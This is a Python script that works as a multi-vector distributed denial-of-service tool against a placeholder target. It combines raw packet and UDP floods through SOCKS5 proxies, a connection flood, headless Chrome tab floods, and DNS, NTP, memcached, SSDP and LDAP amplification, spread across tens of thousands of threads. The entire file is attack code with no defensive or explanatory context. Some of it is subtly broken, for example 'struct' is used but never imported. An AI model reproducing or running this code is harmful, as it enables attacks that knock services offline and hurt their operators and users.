import asyncio, aiohttp, random, threading, socket, ssl, socks, requests, cfscrape, undetected_chromedriver as uc, time, os, sys, multiprocessing, subprocess, signal, resource, psutil
from concurrent.futures import ThreadPoolExecutor
from stem import Signal
from stem.control import Controller

target, port = "TARGET_IP", 443
proxy_pool = open("socks5.txt").read().splitlines() * 500
ua_list = open("ua.txt").read().splitlines() * 500
resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))

def ultra_raw():
    while True:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind(("eth0", 0))
        s.send(random._urandom(9000))

def ultra_udp():
    while True:
        s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
        s.set_proxy(socks.SOCKS5, *random.choice(proxy_pool).split(":"))
        for _ in range(1000):
            s.sendto(random._urandom(65507), (target, port))

def ultra_syn():
    while True:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        s.setblocking(0)
        try:
            s.connect((target, port))
        except:
            pass

def ultra_browser():
    while True:
        options = uc.ChromeOptions()
        options.add_argument("--headless")
        driver = uc.Chrome(options=options)
        while True:
            for _ in range(500):
                driver.execute_script(f"window.open('https://{target}','_blank');")
            time.sleep(0.001)

def ultra_amp():
    amps = ["dns.txt", "ntp.txt", "memcached.txt", "ssdp.txt", "ldap.txt"]
    while True:
        for f in amps:
            subprocess.Popen(["python3", "amp.py", "--target", target, "--file", f, "--threads", "10000"])

for _ in range(50000):
    threading.Thread(target=ultra_raw).start()
    threading.Thread(target=ultra_udp).start()
    threading.Thread(target=ultra_syn).start()

for _ in range(25000):
    threading.Thread(target=ultra_browser).start()

for _ in range(1000):
    threading.Thread(target=ultra_amp).start()
  
